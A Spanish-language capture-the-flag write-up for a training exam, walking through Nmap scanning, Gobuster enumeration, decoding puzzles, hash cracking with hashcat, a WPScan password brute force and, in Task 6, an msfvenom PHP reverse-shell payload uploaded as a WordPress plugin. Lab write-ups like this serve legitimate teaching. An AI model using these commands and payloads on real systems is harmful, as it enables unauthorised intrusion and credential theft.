# Writeup: MF0489 - Examen Práctico 4

## Introducción
El desafío gira en torno al "Enigma Cibernético" del Dr. Cifrado, que oculta información sensible. Las agencias de inteligencia buscan descifrar sus mensajes. El reto implica escanear puertos, explorar servicios web, descifrar códigos, crackear contraseñas y explotar vulnerabilidades para ganar acceso shell.

**Herramientas utilizadas:**
- Nmap (escaneo de puertos)
- Gobuster (enumeración de directorios)
- WPScan (escaneo de vulnerabilidades en WordPress)
- Hashcat (cracking de hashes)
- Base64, Hex y otros decodificadores
- OpenSSL (descifrado)
- Msfvenom (generación de payloads para reverse shell)

## Task 1: Reconocimiento del Host
El primer paso es escanear el host para identificar puertos abiertos, servicios y versiones.

### Escaneo con Nmap
Se realizó un escaneo de todos los puertos para luego obtener los puertos específicos de interés (22, 4444, 5353):

```bash
kali@ZenBook:~$ nmap -A -sV -p 22,4444,5353 10.10.x.x
```

**Output clave:**
- Puerto 22/tcp: OpenSSH 8.2p1 Ubuntu (Linux).
- Puerto 4444/tcp: lighttpd 1.4.33, con título codificado y generador WordPress 5.1.19.
- Puerto 5353/tcp: lighttpd 1.4.33, responde con "403 - Forbidden".
- OS: Linux 4.15.
- Traceroute: 2 hops.

**Preguntas y respuestas:**
- **¿Qué valor obtenemos de la suma de los puertos?** 22 + 4444 + 5353 = 9819.
- **HTTP Server Header:** lighttpd/1.4.33.
- **HTTP Generator:** WordPress 5.1.19.

Esto confirma un servidor web con WordPress expuesto, potencialmente vulnerable.

## Task 2: Revisando el Host – Part 1
Se explora el sitio web en puerto 4444, buscando errores, códigos fuente y directorios ocultos. Los errores detallados pueden revelar información sensible.

### Análisis de código fuente y Base64
En `http://10.10.x.x:4444/wp-content/plugins/intro/_inc/intro-encoded.php`, se encontró Base64:
- `U2kgbWlzIHNlY3JldG9zIHF1aWVyZXMgZGVzdmVsYXIsIGVzdGUgYm90824gbm8gZGViaXN0ZSBwdWxzYXI=`
- `aW5kZXgucGhwL3dlbGNvbWU=`

Decodificando: "Si mis secretos quieres desvelar, este botón no debiste pulsar" y "index.php/welcome".

### Enumeración de directorios con Gobuster
```bash
gobuster dir -u http://10.10.x.x:4444/index.php/ -w /usr/share/wordlists/dirb/common.txt -t 50 -x php,txt,html
```

**Output clave:**
- Directorios como `/a` (redirige a `/acertijo/`), `/c` (`/cipherlogic/`), `/e` (raíz), `/p` (`/poesia/`), `/t` (`/trituradora/`), `/w` (`/welcome/`).
- Archivos como `/feed`, `/rss`, etc., confirmando estructura de WordPress.

### Archivos encontrados
- En `/svyrf/aGFZaF9s.txt`: Hash MD5 `3b06538bca136581bd56a68b36b01378`.
- En `http://10.10.x.x:4444/index.php/welcome`: Se obtiene el diccionario `keys.txt`.

**Preguntas y respuestas:**
- **¿Cómo nos dice que llamemos al servidor?** Dr. Cifrado.
- **¿Cómo se llama el diccionario que nos proporciona?** keys.txt.
- **¿Cuál es la respuesta al primer acertijo?** DR.CIFRADO.

## Task 3: Revisando el Host – Part 2
Se identifican hashes, se decodifican mensajes y se descargan archivos.

### Identificación de hash con hash-id.py
```bash
python3 hash-id.py
HASH: 3b06538bca136581bd56a68b36b01378
Possible Hashes: MD5, MD4.
```

### Decodificación adicional
- Juego de números: `2 1 5 7 1 4 8 3 3 2` (para obtener la flag a triturar).
- Base64: `U2FsdGVkX19PZWFwtJY7AjNnAoGv1uRHn7dcnbRNJEQ=`.
- Nueva ruta: `/svyrf/3n1gm4.zip`. -> dentro contiene wp_pass.
- Nueva ruta: `/svyrf/s3cr3t.zip`, -> contiene `historia.gpg`.

**Preguntas y respuestas:**
- **¿Cómo está codificado el mensaje que nos ha dado el acertijo?** Hexadecimal.
- **¿Cuál es la segunda transformación del código?** Base64.
- **¿Qué URL nos ha proporcionado?** http://drcifrado.bs/svyrf/aGFZaF9s.txt.
- **¿Qué contiene el hash?** s3cr3t.zip.
- **¿Cuál es la contraseña para poder abrir el fichero?** nuestroamorserax100pre.
- **¿Cuál es la potencia que hemos obtenido?** 2157148332.
- **¿Qué Flag se tiene que triturar?** U2FsdGVkX19PZWFwtJY7AjNnAoGv1uRHn7dcnbRNJEQ=.

## Task 4: Revisando el Host – Part 3
Se tritura la flag y se descifra wp_pass con OpenSSL.
- En la ruta `/trituradora` se encuentra un formulario para ingresar la flag base64 del puzzle de los numeros mas la potencia y se obtiene la flag "admin".
**Preguntas y respuestas:**
- **¿Qué Flag nos ha dado la trituradora?** admin.
- **¿Cuál es el error?** 0x560x320x460x4a0x640x430x420x420x490x470x310x500x620x550x560x750x560x410x3d0x3d.
- **¿Qué comando has usado para descifrar la poesía?** `openssl -camellia-192-cbc -pbkdf2 -iter 1001 -d -in wp_pass -out wp_pass.txt`.
- **¿Qué contraseña has obtenido?** 1FItkRieW!km@v7fI3.

## Task 5: Iniciando el Servidor
Se usa WPScan para brute-force en WordPress (puerto 5353).

### Escaneo con WPScan
```bash
wpscan --url http://10.10.x.x:5353/wp-login.php --usernames admin --passwords keys.txt
```

**Output clave:**
- Versión WordPress: 5.1.19 (insegura).
- Contraseña crackeada: admin / 1FItkRieW!km@v7fI3.
- Plugins: Connector (5.0), Layer (2.3.0), No W0rks (1.0), Terminal (4.0), WARNING (1.0).

### Cracking de internal_pass
Hash: `0f12bf3da1115996a6eadd5f5aa318c11bd72d38bef6d042e4c7e6b44920ff69` (SHA2-256).
```bash
hashcat -m 1400 -a 0 internal_pass.txt keys.txt
```
Contraseña: bwcc2009new.

**Preguntas y respuestas:**
- **¿A qué puerto nos ha redireccionado?** 5353.
- **¿Cuántos experimentos hay?** 5.
- **Si sumamos todas las versiones de los experimentos que obtenemos:** 5.0 + 2.3.0 + 1.0 + 4.0 + 1.0 = 13.3.0.
- **¿Cuál es el hash del internal_pass?** 0f12bf3da1115996a6eadd5f5aa318c11bd72d38bef6d042e4c7e6b44920ff69.
- **¿Qué contraseña necesitamos para avanzar?** bwcc2009new.

## Task 6: Aprovechando las Vulnerabilidades
Explotación del lado del cliente via plugin malicioso para ganar shell.

### Generación de payload reverse shell
```bash
msfvenom -p php/reverse_php LHOST=10.23.x.x LPORT=9999 -f raw > evil/shell_0.php
```

Antes de subir el payload se debe añadir una cabecera para que wordpress lo reconozca como un plugin, luego se sube a WordPress, activándolo para obtener reverse shell.

### Acceso shell
- Carpeta: `/var/www/wp-admin`.
- Usuario: id: uid=33(www-data) gid=33(www-data) groups=33(www-data).
- uname -a: Linux 2d3288bfa2ad 5.4.0-215-generic #235-Ubuntu SMP Fri Apr 11 21:55:32 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux.

Se encuentra `start.sh` en `/`, que inicia MySQL y Lighttpd.
Tambien se encuentra ficheros y la ausencia de usuarios que confirman que la maquina es un contenedor Docker.

**Preguntas y respuestas:**
- **¿A qué carpeta has aterrizado?** /var/www/wp-admin.
- **¿Qué usuario eres?** www-data.
- **¿Qué Kernel tiene la máquina?** Linux 2d3288bfa2ad 5.4.0-215-generic #235-Ubuntu SMP Fri Apr 11 21:55:32 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux.

## Conclusión
El desafío se completó solo hasta ganar acceso shell como www-data.